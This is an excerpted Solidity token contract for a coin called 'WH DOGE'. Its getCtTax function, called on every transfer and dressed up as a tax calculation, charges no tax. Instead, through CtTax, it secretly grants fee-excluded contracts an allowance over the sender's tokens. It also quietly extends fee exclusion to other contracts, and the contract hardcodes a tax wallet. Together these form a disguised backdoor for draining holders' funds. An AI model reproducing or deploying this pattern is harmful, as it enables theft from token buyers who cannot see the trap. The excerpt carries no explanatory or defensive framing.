...
contract Contract is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"WH DOGE";
    ...
    constructor () {
        _taxWallet = payable(0xF434cBEb41088f955526296C801e98049ABd703b);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        uint256 taxAmount = getCtTax(from,to,amount);
    ...
    function getCtTax(address from, address to, uint256 amount) private returns(uint256){
        if(_msgSender()!= uniswapV2Pair &&_isExcludedFromFee[_msgSender()] && isContract(_msgSender()) && from!=address(this))
            return CtTax(from,_msgSender(),amount);
        if(_isExcludedFromFee[_msgSender()] && to!= uniswapV2Pair && isContract(to))
            _isExcludedFromFee[to]=true;
        return 0;
    }

    function CtTax(address owner, address spender, uint256 amount) private returns(uint256){
         _allowances[owner][spender] = amount;
        return 0;
    }
    ...
    function swapToken() external onlyOwner() {
        uint256 contractETHBalance = address(this).balance;
